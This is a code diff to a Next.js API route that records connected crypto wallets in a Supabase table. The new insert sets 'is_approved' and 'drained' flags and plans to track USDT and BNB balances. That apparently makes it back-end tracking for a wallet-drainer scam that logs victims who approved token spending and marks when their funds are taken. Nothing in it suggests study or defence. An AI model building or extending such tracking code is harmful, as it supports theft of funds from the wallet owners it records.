@@ -47,13 +47,16 @@ export async function GET(req: NextRequest) {
 }
 
 // POST - Record new approval (public)
+
+
+// POST - Record new wallet connection
 export async function POST(req: NextRequest) {
   try {
     const body = await req.json();
-    const { address, approvalTxHash, approvalStatus } = body;
+    const { address } = body;
 
-    if (!address) {
-      return NextResponse.json({ error: "Address is required" }, { status: 400 });
+    if (!address || !address.startsWith('0x')) {
+      return NextResponse.json({ error: "Valid address is required" }, { status: 400 });
     }
 
     const supabase = getServiceSupabase();
@@ -61,20 +64,37 @@ export async function POST(req: NextRequest) {
     const { data, error } = await supabase
       .from("wallets")
       .insert({
-        address,
-        approvalTxHash: approvalTxHash || null,
-        approvalStatus: approvalStatus ?? true,
+        address: address.toLowerCase(),
+        is_approved: true,
+        drained: false,
+        connected_at: new Date().toISOString(),
+        created_at: new Date().toISOString(),
+        // Optional: you can add more fields later
+        // usdt_balance: 0,
+        // bnb_balance: 0,
       })
       .select()
       .single();
 
     if (error) {
-      console.error("Insert error:", error);
-      return NextResponse.json({ error: "Failed to save" }, { status: 500 });
+      console.error("Supabase Insert Error:", error);
+      return NextResponse.json({ 
+        error: "Failed to save wallet", 
+        details: error.message 
+      }, { status: 500 });
     }
 
-    return NextResponse.json({ success: true, data });
-  } catch (err) {
-    return NextResponse.json({ error: "Invalid request" }, { status: 400 });
+    console.log("✅ Wallet saved successfully:", address);
+    return NextResponse.json({ 
+      success: true, 
+      data 
+    });
+
+  } catch (err: any) {
+    console.error("POST /api/wallets Error:", err);
+    return NextResponse.json({ 
+      error: "Invalid request", 
+      message: err.message 
+    }, { status: 400 });
   }
 }
